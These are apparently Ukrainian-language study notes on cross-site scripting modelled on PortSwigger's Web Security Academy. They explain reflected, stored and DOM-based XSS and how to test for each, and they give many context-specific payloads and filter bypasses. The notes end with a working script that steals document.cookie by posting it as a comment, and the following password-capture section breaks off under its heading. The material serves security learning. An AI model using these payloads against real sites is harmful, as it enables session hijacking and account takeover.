## What is cross-site scripting (XSS)?

**Міжсайтовий скриптинг** (також відомий як **XSS**) - це вразливість веббезпеки, яка дозволяє зловмиснику скомпрометувати взаємодію користувачів із вразливим застосунком. Вона дає змогу зловмиснику обійти політику одного походження, яка призначена для ізоляції різних вебсайтів один від одного.

Вразливості міжсайтового скриптингу зазвичай дозволяють зловмиснику видавати себе за користувача-жертву, виконувати будь-які дії, які може виконувати цей користувач, а також отримувати доступ до будь-яких даних користувача. Якщо користувач-жертва має привілейований доступ у межах застосунку, зловмисник може отримати повний контроль над усією функціональністю та даними застосунку.

## How does XSS work?

**Міжсайтовий скриптинг** працює шляхом маніпулювання вразливим вебсайтом так, що він повертає шкідливий JavaScript користувачам. Коли шкідливий код виконується в браузері жертви, зловмисник може повністю скомпрометувати її взаємодію із застосунком.

## XSS proof of concept

Ви можете підтвердити більшість видів уразливостей XSS, інʼєктуючи корисне навантаження (payload), яке змушує ваш власний браузер виконати довільний JavaScript. Уже давно поширеною практикою для цього є використання функції `alert()`, оскільки вона коротка, безпечна та її досить складно не помітити, коли вона успішно викликається. Фактично, більшість наших XSS-лабораторних робіт ви розв’язуєте, викликаючи `alert()` у браузері змодельованої жертви.

На жаль, при використанні Chrome існує невелика проблема. Починаючи з версії 92 (20 липня 2021 року), крос-доменним iframe заборонено викликати `alert()`. Оскільки вони використовуються для побудови деяких більш складних XSS-атак, інколи вам доведеться застосовувати альтернативний PoC-payload. У такому випадку ми рекомендуємо функцію `print()`. 

## What are the types of XSS attacks?

Існує три основні типи XSS-атак. Це:

- **Відображений XSS (Reflected XSS)** - коли шкідливий скрипт надходить із поточного HTTP-запиту.
    
- **Збережений XSS (Stored XSS)** - коли шкідливий скрипт надходить із бази даних вебсайту.
    
- **DOM-орієнтований XSS (DOM-based XSS)** - коли вразливість існує в клієнтському коді, а не в серверному коді.

# Reflected XSS

## What is reflected cross-site scripting?

**Відображений міжсайтовий скриптинг (Reflected XSS)** виникає тоді, коли застосунок отримує дані в HTTP-запиті та небезпечним чином включає ці дані безпосередньо у відповідь.

Припустімо, що вебсайт має функцію пошуку, яка отримує введений користувачем пошуковий запит через параметр URL:

`https://insecure-website.com/search?term=gift`

Застосунок відображає переданий пошуковий термін у відповіді на цей URL:
```
<p>You searched for: gift</p>
```
За умови, що застосунок не виконує жодної додаткової обробки цих даних, зловмисник може сконструювати атаку таким чином:

`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

Цей URL призводить до такої відповіді:
```
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```
## Impact of reflected XSS attacks

Якщо зловмисник може керувати скриптом, який виконується в браузері жертви, то зазвичай він може повністю скомпрометувати цього користувача. Серед іншого, зловмисник може:

- виконувати будь-які дії в межах застосунку, які може виконувати користувач;
    
- переглядати будь-яку інформацію, до якої користувач має доступ;
    
- змінювати будь-яку інформацію, яку користувач може змінювати;
    
- ініціювати взаємодію з іншими користувачами застосунку, включно зі шкідливими атаками, які виглядатимуть так, ніби вони походять від початкового користувача-жертви.
    
Існують різні способи, за допомогою яких зловмисник може змусити користувача-жертву виконати запит, який він контролює, щоб здійснити атаку відображеного XSS. До них належать розміщення посилань на вебсайті, контрольованому зловмисником, або на іншому вебсайті, який дозволяє генерувати вміст, а також надсилання посилання електронною поштою, у твіті чи в іншому повідомленні. Атака може бути спрямована безпосередньо проти конкретного відомого користувача або ж бути невибірковою — проти будь-яких користувачів застосунку.

Необхідність зовнішнього механізму доставки атаки означає, що вплив відображеного XSS зазвичай є менш серйозним, ніж у випадку збереженого XSS, де самодостатню атаку можна доставити безпосередньо через сам вразливий застосунок.

## How to find and test for reflected XSS vulnerabilities

Переважну більшість уразливостей відображеного міжсайтового скриптингу (Reflected XSS) можна швидко та надійно виявити за допомогою вебсканера вразливостей Burp Suite.

Ручне тестування на уразливості відображеного XSS передбачає такі кроки:

**Тестування всіх точок введення.**  
Окремо протестуйте кожну точку введення даних в HTTP-запитах застосунку. Це включає параметри або інші дані в рядку запиту URL та в тілі повідомлення, а також шлях до файлу в URL. Також це включає HTTP-заголовки, хоча XSS-подібна поведінка, яку можна викликати лише через певні HTTP-заголовки, на практиці може бути неексплуатованою.

**Надсилання випадкових алфавітно-цифрових значень.**  
Для кожної точки введення надішліть унікальне випадкове значення та визначте, чи відображається воно у відповіді. Значення має бути спроєктоване так, щоб проходити більшість перевірок введення, тому воно повинно бути досить коротким і містити лише алфавітно-цифрові символи. Водночас воно має бути достатньо довгим, щоб випадкові збіги у відповіді були малоймовірними. Випадкове алфавітно-цифрове значення довжиною приблизно 8 символів зазвичай є оптимальним. Ви можете використовувати числові payload-и Burp Intruder з випадково згенерованими шістнадцятковими значеннями для створення відповідних випадкових рядків. Також можна скористатися налаштуваннями grep payloads у Burp Intruder, щоб автоматично позначати відповіді, які містять надіслане значення.

**Визначення контексту відображення.**  
Для кожного місця у відповіді, де відображається випадкове значення, визначте його контекст. Це може бути текст між HTML-тегами, значення атрибута тега (яке може бути взяте в лапки), рядок JavaScript тощо.

**Тестування кандидатного payload-а.**  
На основі контексту відображення протестуйте початковий кандидатний XSS-payload, який спричинить виконання JavaScript, якщо він буде відображений у відповіді без змін. Найпростіший спосіб тестування payload-ів — надіслати запит до Burp Repeater, змінити запит, вставивши кандидатний payload, виконати запит і переглянути відповідь, щоб перевірити, чи спрацював payload. Ефективний підхід полягає в тому, щоб залишити початкове випадкове значення в запиті та розмістити кандидатний XSS-payload перед ним або після нього. Потім встановіть випадкове значення як пошуковий термін у вікні перегляду відповіді Burp Repeater. Burp підсвітить кожне місце, де з’являється пошуковий термін, дозволяючи швидко знайти відображення.

**Тестування альтернативних payload-ів.**  
Якщо кандидатний XSS-payload був змінений застосунком або повністю заблокований, необхідно протестувати альтернативні payload-и та техніки, які можуть забезпечити працездатну XSS-атаку залежно від контексту відображення та типу перевірки введення, що застосовується. 

**Тестування атаки в браузері.**  
Нарешті, якщо вам вдалося знайти payload, який, на вашу думку, працює в Burp Repeater, перенесіть атаку в реальний браузер (вставивши URL в адресний рядок або змінивши запит у режимі перехоплення Burp Proxy) і перевірте, чи дійсно інʼєктований JavaScript виконується. Часто найкраще виконати простий JavaScript, наприклад `alert(document.domain)`, який у разі успіху атаки викличе видиме спливаюче вікно в браузері.

## Common questions about reflected cross-site scripting

**У чому різниця між відображеним XSS і збереженим XSS?**  
Відображений XSS виникає тоді, коли застосунок бере певні дані з HTTP-запиту та небезпечним чином вбудовує ці дані в негайну відповідь. У випадку збереженого XSS застосунок натомість зберігає введені дані та небезпечним чином вбудовує їх у пізнішу відповідь.

**У чому різниця між відображеним XSS і self-XSS?**  
Self-XSS передбачає подібну поведінку застосунку, як і звичайний відображений XSS, однак його неможливо викликати стандартними способами — через спеціально сформований URL або міждоменний запит. Натомість уразливість спрацьовує лише тоді, коли сама жертва вводить XSS-payload зі свого браузера. Здійснення атаки self-XSS зазвичай передбачає застосування соціальної інженерії, щоб змусити жертву вставити надані зловмисником дані у свій браузер. Через це self-XSS зазвичай вважається слабкою проблемою з незначним впливом.

## XSS in HTML tag attributes

Коли XSS-контекст знаходиться в значенні атрибута HTML-тега, інколи можна завершити значення атрибута, закрити тег і додати новий. Наприклад:
```
"><script>alert(document.domain)</script>
```
Однак частіше в такій ситуації кутові дужки блокуються або кодуються, тому введені дані не можуть «вийти» за межі тега, в якому вони з’являються. За умови, що вам вдається завершити значення атрибута, зазвичай можна додати новий атрибут, який створює скриптовий контекст, наприклад обробник події. Наприклад:
```
" autofocus onfocus=alert(document.domain) x="
```
Наведений вище payload створює подію `onfocus`, яка виконає JavaScript, коли елемент отримає фокус, а також додає атрибут `autofocus`, щоб спробувати автоматично ініціювати подію `onfocus` без будь-якої взаємодії з користувачем. Нарешті, він додає `x="`, щоб коректно «відновити» подальшу HTML-розмітку.

Іноді XSS-контекст знаходиться в такому типі атрибута HTML-тега, який сам по собі може створювати скриптовий контекст. У цьому випадку можна виконати JavaScript без необхідності завершувати значення атрибута. Наприклад, якщо XSS-контекст знаходиться в атрибуті `href` тега посилання (`a`), можна використати псевдопротокол `javascript` для виконання скрипта. Наприклад:
```
<a href="javascript:alert(document.domain)">
```
Ви можете зіткнутися з вебсайтами, які кодують кутові дужки, але водночас усе ще дозволяють інʼєкцію атрибутів. Іноді такі інʼєкції можливі навіть усередині тегів, які зазвичай не запускають події автоматично, наприклад тега `canonical`. Таку поведінку можна експлуатувати, використовуючи **клавіші доступу (access keys)** та взаємодію з користувачем у Chrome.

Клавіші доступу дозволяють задавати комбінації клавіш, що посилаються на конкретний елемент. Атрибут `accesskey` дає змогу визначити літеру, натискання якої в поєднанні з іншими клавішами (які відрізняються залежно від платформи) призводить до спрацювання подій.Приклад коду:
```
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) - доступно тільки для хрома, спрацьовує при комбінаціїї клавіш - ALT+SHIFT+X, CTRL+ALT+X, Alt+X
```
Також можна експлуатувати XSS у прихованих полях введення (`hidden input fields`), використовуючи техніку, розроблену дослідниками PortSwigger Research.

## XSS into JavaScript

Коли XSS-контекст знаходиться всередині вже наявного JavaScript у відповіді, може виникати широкий спектр ситуацій, для яких потрібні різні техніки, щоб успішно виконати експлойт.

### Terminating the existing script

У найпростішому випадку можливо просто закрити тег `script`, який містить наявний JavaScript, і додати нові HTML-теги, що ініціюють виконання JavaScript. Наприклад, якщо XSS-контекст виглядає так:
```
<script>
...
var input = 'controllable data here';
...
</script>
```
тоді можна використати такий payload, щоб «вийти» з наявного JavaScript і виконати власний код:
```
</script><img src=1 onerror=alert(document.domain)>
```
Причина, чому це працює, полягає в тому, що браузер спочатку виконує HTML-парсинг для визначення елементів сторінки, включно з блоками скриптів, і лише згодом виконує парсинг JavaScript для розуміння та виконання вбудованих скриптів. Наведений вище payload залишає початковий скрипт пошкодженим, із незавершеним рядковим літералом. Однак це не заважає наступному скрипту бути коректно розібраним і виконаним у звичайному режимі.

### Breaking out of a JavaScript string

У випадках, коли XSS-контекст знаходиться всередині рядкового літерала, взятого в лапки, часто можливо «вийти» з цього рядка та безпосередньо виконати JavaScript. При цьому вкрай важливо коректно відновити скрипт після XSS-контексту, оскільки будь-які синтаксичні помилки в ньому завадять виконанню всього скрипта.

Деякі корисні способи виходу з рядкового літерала:
```
'-alert(document.domain)-' 
';alert(document.domain)//
```
Деякі застосунки намагаються запобігти виходу введених даних за межі рядка JavaScript, екрануючи всі одиночні лапки за допомогою зворотної косої риски (`\`). Зворотна коса риска перед символом повідомляє парсеру JavaScript, що цей символ слід інтерпретувати буквально, а не як спеціальний символ, наприклад завершувач рядка. У такій ситуації застосунки часто припускаються помилки, не екрануючи сам символ зворотної косої риски. Це означає, що зловмисник може використати власний символ `\`, щоб нейтралізувати зворотну косу риску, додану застосунком.
Наприклад, припустімо, що введені дані:
```
';alert(document.domain)//
```
перетворюються на:
```
\';alert(document.domain)//
```
Тепер можна використати альтернативний payload:
```
\';alert(document.domain)//
```
який перетворюється на:
```
\\';alert(document.domain)//
```
Тут перша зворотна коса риска означає, що друга зворотна коса риска інтерпретується буквально, а не як спеціальний символ. Це призводить до того, що лапка тепер інтерпретується як завершувач рядка, і, відповідно, атака стає успішною.

Деякі вебсайти ускладнюють XSS, обмежуючи набір символів, які дозволено використовувати. Це може реалізовуватися на рівні самого вебсайту або шляхом використання WAF, який блокує запити ще до того, як вони досягнуть сайту. У таких ситуаціях потрібно експериментувати з іншими способами виклику функцій, які обходять ці механізми захисту.

Один із таких способів — використання оператора `throw` разом з обробником винятків. Це дозволяє передавати аргументи у функцію без використання круглих дужок. Наведений нижче код призначає функцію `alert()` глобальним обробником помилок, а оператор `throw` передає значення `1` обробнику винятку (у цьому випадку — `alert`). У результаті функція `alert()` викликається з аргументом `1`.
```
onerror=alert;throw 1
```
Існує кілька способів використання цієї техніки для виклику функцій без круглих дужок. Ось приклад:
```
`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
```
- Payload підміняє `toString`
    
- Виконується `window + ''`
    
- JS викликає `toString`
    
- `toString` → `throw 1337`
    
- `throw` → `onerror(1337)`
    
- `onerror = alert`
    
- `alert(1337)`
Використано:

- `throw` → виклик без `()`
    
- `onerror` → глобальний хендлер
    
- `toString` → автоматичний виклик
    
- `window + ''` → примусове виконання
### Making use of HTML-encoding

Коли контекст XSS знаходиться всередині **існуючого JavaScript-коду в значенні HTML-атрибута в лапках**, наприклад в обробнику події, можна використати **HTML-кодування**, щоб обійти деякі фільтри введення.

Після того як браузер розпарсив HTML-теги та атрибути у відповіді, він **виконує HTML-декодування значень атрибутів** перед подальшою обробкою. Якщо серверний застосунок блокує або санітизує певні символи, необхідні для успішної XSS-атаки, часто можна **обійти таку валідацію**, закодувавши ці символи у вигляді HTML-сутностей.

Наприклад, якщо контекст XSS виглядає так:
```
<a href="#" onclick="... var input='controllable data here'; ...">
```
і застосунок **блокує або екранує одиночні лапки**, ви можете використати такий payload, щоб вийти з JavaScript-рядка та виконати власний код:
```
&apos;-alert(document.domain)-&apos;  знак - вклеює наш пейлоад в код
```
Послідовність `&apos;` — це **HTML-сутність**, що представляє апостроф (одиночну лапку). Оскільки браузер **HTML-декодує значення атрибута `onclick` перед виконанням JavaScript**, ці сутності декодуються в лапки, які стають **роздільниками рядків**, у результаті чого атака успішно спрацьовує.

### XSS in JavaScript template literals

**Шаблонні рядки JavaScript (template literals)** — це рядкові літерали, які дозволяють вбудовувати JavaScript-вирази. Вбудовані вирази обчислюються і зазвичай конкатенуються (об’єднуються) з навколишнім текстом. Шаблонні рядки беруться в **бектики** (`` ` ``), а вбудовані вирази позначаються синтаксисом **`${...}`**.

Наприклад, наступний скрипт виведе привітальне повідомлення, яке містить ім’я користувача:
```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```
Коли контекст XSS знаходиться **всередині шаблонного рядка JavaScript**, немає потреби закривати цей рядок. Замість цього достатньо використати синтаксис **`${...}`**, щоб вбудувати JavaScript-вираз, який буде виконаний під час обробки шаблонного рядка.

Наприклад, якщо XSS-контекст виглядає так:
```
<script> 
...
var input = `controllable data here`; 
... 
</script>
```
то можна використати наступний payload, щоб виконати JavaScript **без закриття шаблонного рядка**:
```
${alert(document.domain)}
```
# Stored XSS

## What is stored cross-site scripting?

**Збережений міжсайтовий скриптинг** (також відомий як **XSS другого порядку** або **постійний XSS**) виникає тоді, коли застосунок отримує дані з ненадійного джерела та небезпечним чином включає ці дані у свої подальші HTTP-відповіді.

Припустімо, що вебсайт дозволяє користувачам залишати коментарі до записів у блозі, які відображаються іншим користувачам. Користувачі надсилають коментарі за допомогою такого HTTP-запиту:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```
Після надсилання цього коментаря будь-який користувач, який відвідає відповідний запис у блозі, отримає у відповіді застосунку таке:
```
<p>This post was extremely helpful.</p>
```
За умови, що застосунок не виконує жодної додаткової обробки даних, зловмисник може надіслати шкідливий коментар, наприклад:
```
<script>/* Bad stuff here... */</script>
```
У запиті зловмисника цей коментар буде URL-кодований таким чином:
```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```
Тепер будь-який користувач, який відвідає запис у блозі, отримає у відповіді застосунку таке:
```
<p><script>/* Bad stuff here... */</script></p>
```
Скрипт, наданий зловмисником, після цього буде виконано в браузері користувача-жертви в контексті його сесії з цим застосунком.

## Impact of stored XSS attacks

Якщо зловмисник може керувати скриптом, який виконується в браузері жертви, то зазвичай він може повністю скомпрометувати цього користувача. Зловмисник може виконувати будь-які дії, що відповідають наслідкам уразливостей відображеного XSS.

З точки зору експлуатованості ключова відмінність між відображеним і збереженим XSS полягає в тому, що уразливість збереженого XSS дозволяє здійснювати атаки, які є самодостатніми в межах самого застосунку. Зловмиснику не потрібно шукати зовнішній спосіб змусити інших користувачів виконати певний запит, що містить його експлойт. Натомість зловмисник розміщує свій експлойт безпосередньо в застосунку та просто чекає, поки користувачі з ним зіткнуться.

Самодостатній характер експлойтів збереженого міжсайтового скриптингу є особливо важливим у ситуаціях, коли XSS-уразливість впливає лише на користувачів, які на даний момент увійшли в застосунок. Якщо XSS є відображеним, атака повинна бути вдало синхронізованою: користувач, якого змусили виконати запит зловмисника в той момент, коли він не авторизований, не буде скомпрометований. Натомість у випадку збереженого XSS користувач гарантовано буде авторизований у момент, коли він зіткнеться з експлойтом.

## How to find and test for stored XSS vulnerabilities

Багато уразливостей збереженого XSS можна виявити за допомогою вебсканера вразливостей Burp Suite.

Ручне тестування уразливостей збереженого XSS може бути складним. Необхідно протестувати всі відповідні **«точки входу»**, через які дані, контрольовані зловмисником, можуть потрапляти в обробку застосунку, а також усі **«точки виходу»**, у яких ці дані можуть з’являтися у відповідях застосунку.

**Точки входу** в обробку застосунку включають:

- параметри або інші дані в рядку запиту URL та в тілі повідомлення;
    
- шлях до файлу в URL;
    
- HTTP-заголовки запитів, які можуть бути неексплуатованими у випадку відображеного XSS;
    
- будь‑які позасмугові (out-of-band) шляхи, за допомогою яких зловмисник може передати дані в застосунок. Наявні шляхи повністю залежать від реалізованої функціональності застосунку: вебпоштова система оброблятиме дані, отримані в електронних листах; застосунок, що відображає стрічку Twitter, може обробляти дані зі сторонніх твітів; а агрегатор новин включатиме дані, що походять з інших вебсайтів.
    

**Точками виходу** для атак збереженого XSS є всі можливі HTTP-відповіді, які повертаються будь-якому типу користувачів застосунку за будь-яких обставин.

Першим кроком у тестуванні уразливостей збереженого XSS є виявлення звʼязків між точками входу та точками виходу, за яких дані, надіслані в точку входу, виводяться через точку виходу. Причини, через які це може бути складно, полягають у тому, що:

- дані, надіслані в будь-яку точку входу, теоретично можуть бути виведені через будь-яку точку виходу. Наприклад, імена відображення, введені користувачем, можуть з’являтися в малопомітному журналі аудиту, доступному лише деяким користувачам застосунку;
    
- дані, які наразі зберігаються застосунком, часто можуть бути перезаписані внаслідок інших дій у застосунку. Наприклад, функція пошуку може відображати список нещодавніх пошуків, які швидко замінюються, коли користувачі виконують нові пошуки.
    

Для повного виявлення звʼязків між точками входу та виходу необхідно було б окремо тестувати кожну можливу комбінацію: надсилати конкретне значення в точку входу, безпосередньо переходити до точки виходу та визначати, чи з’являється там це значення. Однак такий підхід є непрактичним у застосунку з більш ніж кількома сторінками.

Натомість більш реалістичний підхід полягає в систематичній роботі з точками введення даних: надсиланні конкретного значення в кожну з них і моніторингу відповідей застосунку з метою виявлення випадків, коли це значення з’являється. Особливу увагу варто приділяти відповідним функціям застосунку, наприклад коментарям до записів у блозі. Коли надіслане значення спостерігається у відповіді, необхідно визначити, чи ці дані дійсно зберігаються між різними запитами, а не просто відображаються в негайній відповіді.

Після виявлення звʼязків між точками входу та виходу в обробці застосунку кожен такий звʼязок необхідно окремо протестувати, щоб визначити наявність уразливості збереженого XSS. Це передбачає визначення контексту у відповіді, в якому з’являються збережені дані, та тестування відповідних кандидатних XSS‑payload-ів, придатних для цього контексту. На цьому етапі методологія тестування загалом така сама, як і при пошуку уразливостей відображеного XSS.

# DOM-based XSS

## What is DOM-based cross-site scripting?

**DOM-орієнтовані XSS‑уразливості** зазвичай виникають тоді, коли JavaScript бере дані з джерела, контрольованого зловмисником (наприклад, з URL), і передає їх у «приймач» (sink), який підтримує динамічне виконання коду, такий як `eval()` або `innerHTML`. Це дає змогу зловмисникам виконувати шкідливий JavaScript, що зазвичай дозволяє їм захоплювати облікові записи інших користувачів.

Щоб здійснити DOM‑based XSS‑атаку, необхідно розмістити дані в джерелі таким чином, щоб вони були передані до приймача й спричинили виконання довільного JavaScript.

Найпоширенішим джерелом для DOM XSS є URL, до якого зазвичай звертаються через об’єкт `window.location`. Зловмисник може сконструювати посилання, яке перенаправляє жертву на вразливу сторінку з payload-ом у рядку запиту або у фрагменті URL. За певних обставин, наприклад при атаці на сторінку 404 або на вебсайт, що працює на PHP, payload також може бути розміщений у шляху URL.

## How to test for DOM-based cross-site scripting

Більшість уразливостей DOM XSS можна швидко та надійно виявити за допомогою вебсканера вразливостей Burp Suite. Для ручного тестування DOM‑орієнтованого міжсайтового скриптингу зазвичай потрібно використовувати браузер з інструментами розробника, наприклад Chrome. Необхідно по черзі опрацювати кожне доступне джерело та тестувати кожне з них окремо.

### Тестування HTML‑приймачів (HTML sinks)

Щоб протестувати DOM XSS в HTML‑приймачі, помістіть випадковий алфавітно‑цифровий рядок у джерело (наприклад, `location.search`), а потім за допомогою інструментів розробника проінспектуйте HTML і знайдіть, де саме з’являється цей рядок. Зверніть увагу, що опція браузера **«View source»** не підходить для тестування DOM XSS, оскільки вона не враховує зміни HTML, виконані JavaScript. В інструментах розробника Chrome можна скористатися **Control+F** (або **Command+F** на macOS), щоб виконати пошук по DOM.

Для кожного місця, де ваш рядок з’являється в DOM, потрібно визначити контекст. На основі цього контексту необхідно уточнювати введені дані, щоб побачити, як вони обробляються. Наприклад, якщо ваш рядок з’являється всередині атрибута, взятого в подвійні лапки, спробуйте інʼєктувати подвійні лапки у свій рядок, щоб перевірити, чи вдасться «вийти» з атрибута.

Зверніть увагу, що браузери по‑різному поводяться щодо URL‑кодування. Chrome, Firefox і Safari URL‑кодують `location.search` та `location.hash`, тоді як IE11 і Microsoft Edge (до Chromium) цього не роблять. Якщо ваші дані URL‑кодуються перед обробкою, XSS‑атака, ймовірно, не спрацює.

---

### Тестування приймачів виконання JavaScript

Тестування приймачів виконання JavaScript для DOM‑based XSS є дещо складнішим. У таких приймачах ваші вхідні дані не обовʼязково зʼявляються в DOM, тому їх неможливо просто знайти пошуком. Натомість потрібно використовувати налагоджувач JavaScript, щоб визначити, чи передаються ваші дані до приймача і яким чином.

Для кожного потенційного джерела, наприклад `location`, спочатку потрібно знайти місця в JavaScript‑коді сторінки, де це джерело використовується. В інструментах розробника Chrome можна скористатися **Control+Shift+F** (або **Command+Alt+F** на macOS), щоб виконати пошук по всьому JavaScript‑коду сторінки.

Після того як ви знайдете, де джерело зчитується, можна використати налагоджувач JavaScript, щоб додати точку зупину (breakpoint) і простежити, як використовується значення джерела. Ви можете виявити, що значення джерела присвоюється іншим змінним. У такому разі потрібно знову скористатися функцією пошуку, щоб відстежити ці змінні та перевірити, чи передаються вони до приймача. Коли ви знайдете приймач, якому присвоюються дані, що походять із джерела, можна за допомогою налагоджувача переглянути значення, навівши курсор на змінну, щоб побачити її значення перед передачею до приймача. Далі, як і у випадку з HTML‑приймачами, потрібно уточнювати введені дані, щоб перевірити, чи можна здійснити успішну XSS‑атаку.

### Тестування DOM XSS за допомогою DOM Invader

Виявлення та експлуатація DOM XSS у реальних умовах може бути виснажливим процесом, який часто вимагає ручного аналізу складного, мініфікованого JavaScript‑коду. Однак якщо ви використовуєте браузер Burp, ви можете скористатися вбудованим розширенням **DOM Invader**, яке бере на себе значну частину цієї складної роботи.

## Exploiting DOM XSS with different sources and sinks

В принципі, вебсайт є вразливим до DOM‑орієнтованого міжсайтового скриптингу, якщо існує виконуваний шлях, яким дані можуть поширюватися від джерела до приймача (sink). На практиці різні джерела та приймачі мають різні властивості й поведінку, які можуть впливати на можливість експлуатації та визначати, які саме техніки є необхідними. Крім того, скрипти вебсайту можуть виконувати валідацію або іншу обробку даних, яку потрібно враховувати під час спроби експлуатації уразливості. Існує низка приймачів, що мають значення для DOM‑орієнтованих уразливостей. 

Приймач `document.write` працює зі скриптовими елементами, тому можна використовувати простий payload, наприклад такий:
```
document.write('... <script>alert(document.domain)</script> ...');

```
**Однак зверніть увагу**, що в деяких ситуаціях вміст, який записується через `document.write`, може містити певний **навколишній контекст**, який потрібно враховувати під час експлуатації вразливості. Наприклад, перед використанням свого JavaScript‑payload вам може знадобитися **закрити деякі вже існуючі HTML‑елементи**.

**Sink `innerHTML`** не приймає елементи `<script>` у жодному сучасному браузері, так само як і **події `onload` у SVG** не виконуються. Це означає, що потрібно використовувати **альтернативні елементи**, такі як `<img>` або `<iframe>`.

Обробники подій, наприклад **`onload`** та **`onerror`**, можна використовувати разом із цими елементами. Наприклад:
```
element.innerHTML = '... <img src=1 onerror=alert(document.domain)> ...'
```
### Sources and sinks in third-party dependencies

Сучасні веб‑застосунки зазвичай будуються з використанням багатьох **сторонніх бібліотек і фреймворків**, які надають розробникам додаткові функції та можливості. Важливо пам’ятати, що деякі з них також можуть бути **потенційними джерелами та sinks для DOM‑XSS**.

#### DOM XSS in jQuery
Якщо використовується JavaScript‑бібліотека, така як **jQuery**, варто звертати увагу на sinks, які можуть змінювати DOM‑елементи сторінки. Наприклад, функція **`attr()`** у jQuery може змінювати атрибути DOM‑елементів.

Якщо дані зчитуються з **керованого користувачем джерела**, наприклад з URL, а потім передаються у функцію `attr()`, то може з’явитися можливість виконати XSS. Наприклад, нижче наведено JavaScript‑код, який змінює атрибут **`href`** у тегу `<a>` на основі даних з URL:

```
$(function() {
	$('#backLink').attr(
		"href",
		(new URLSearchParams(window.location.search)).get('returnUrl')
	);
});
```
Цю вразливість можна експлуатувати, **змінивши URL так**, щоб джерело `location.search` містило шкідливий JavaScript‑URL. Після того як JavaScript сторінки застосує цей шкідливий URL до атрибуту `href` посилання «Назад», **натискання на це посилання призведе до виконання коду**:
```
?returnUrl=javascript:alert(document.domain)
```

Ще один потенційний **sink**, на який варто звертати увагу, — це **селекторна функція jQuery `$()`**, яку можна використати для вставки шкідливих об’єктів у DOM.

jQuery раніше був надзвичайно популярним, і **класична DOM XSS‑вразливість** виникала через те, що сайти використовували цей селектор разом із джерелом **`location.hash`** для анімацій або автоматичної прокрутки до певного елемента на сторінці. Така поведінка часто реалізовувалася за допомогою вразливого обробника події **`hashchange`**, подібного до наведеного нижче:
```
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
Оскільки **hash** контролюється користувачем, зловмисник може використати це для ін’єкції XSS‑payload у sink `$()`.

Більш нові версії jQuery **виправили цю конкретну вразливість**, заборонивши вставку HTML у селектор, якщо введені дані починаються зі знака решітки (`#`). Проте **вразливий код все ще можна зустріти в реальних проєктах**.

Щоб реально експлуатувати цю класичну вразливість, потрібно знайти спосіб **спровокувати подію `hashchange` без взаємодії користувача**. Один із найпростіших способів — **доставити експлойт через iframe**:
```
<iframe src="https://vulnerable-website.com#"
        onload="this.src+='<img src=1 onerror=alert(1)>'">
```
У цьому прикладі атрибут `src` вказує на вразливу сторінку з порожнім значенням hash. Коли iframe завантажується, до hash **додається XSS‑вектор**, що призводить до спрацювання події `hashchange`.

#### DOM XSS in AngularJS

Якщо використовується фреймворк на кшталт **AngularJS**, може бути можливим виконати JavaScript **без використання кутових дужок (`< >`) або обробників подій**. Коли сайт використовує атрибут **`ng-app`** на HTML‑елементі, цей елемент обробляється AngularJS.

У такому випадку **AngularJS виконує JavaScript‑код, що знаходиться всередині подвійних фігурних дужок `{{ }}`**, які можуть з’являтися безпосередньо в HTML або всередині атрибутів. Шукати потрібно бібліотеках, якщо там є ангуляр то є сенс цієї експлуатації. Приклад експлоїта:
```
{{constructor.constructor('alert(1)')()}}
```
## DOM XSS combined with reflected and stored data

Деякі **чисті DOM‑based вразливості** є самодостатніми в межах **однієї сторінки**. Якщо скрипт зчитує певні дані з URL і записує їх у небезпечний sink, то така вразливість є **повністю клієнтською**.

Однак джерела (**sources**) не обмежуються лише даними, які напряму надає браузер - вони також можуть **походити від самого сайту**. Наприклад, вебсайти часто **відображають параметри URL в HTML‑відповіді сервера**. Зазвичай це асоціюється зі звичайним XSS, але також може призводити до **reflected DOM XSS‑вразливостей**.

У випадку **reflected DOM XSS** сервер обробляє дані з HTTP‑запиту та **відображає їх у відповіді**. Відображені дані можуть бути розміщені **всередині рядка JavaScript** або як елемент даних у DOM, наприклад у полі форми. Після цього скрипт на сторінці **небезпечним чином обробляє ці відображені дані** і зрештою записує їх у **небезпечний sink**.

Наприклад:
```
eval('var data = "відображений рядок"');
```
Тоді експлоїт:
```
\"};-alert(123);//
```

Вебсайти також можуть **зберігати дані на сервері** та відображати їх в інших місцях. У випадку **stored DOM XSS‑вразливості** сервер отримує дані з одного запиту, **зберігає їх**, а потім **включає ці дані в пізнішу відповідь**.

Скрипт у цій пізнішій відповіді містить **sink**, який **небезпечним чином обробляє ці дані**.
```
element.innerHTML = comment.author
```

## Exploiting cross-site scripting to steal cookies

**Крадіжка cookies** - це традиційний спосіб експлуатації XSS. Більшість веб‑застосунків використовують **cookies для керування сесіями**. За допомогою XSS‑вразливостей можна змусити браузер жертви **відправити її cookies на домен зловмисника**, після чого вручну підставити ці cookies у свій браузер і **видати себе за жертву**.

На практиці цей підхід має кілька суттєвих обмежень:

- Жертва може **не бути залогіненою**.
    
- Багато застосунків **приховують cookies від JavaScript**, використовуючи прапорець **HttpOnly**.
    
- Сесії можуть бути **прив’язані до додаткових факторів**, наприклад до IP‑адреси користувача.
Приклад експлуатації: 
```
<script>
window.addEventListener('DOMContentLoaded', function(){


var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 7);
data.append('comment', document.cookie);
data.append('name', 'hacker');
data.append('email', 'a@a');
data.append('website', 'http://www.home.com');

fetch('/post/comment', {
   method: 'POST',
   mode: 'no-cors',
   body: data
  });
});
</script>
```
Цей експлоїт краде document.cookie жертви.

## Exploiting cross-site scripting to capture passwords

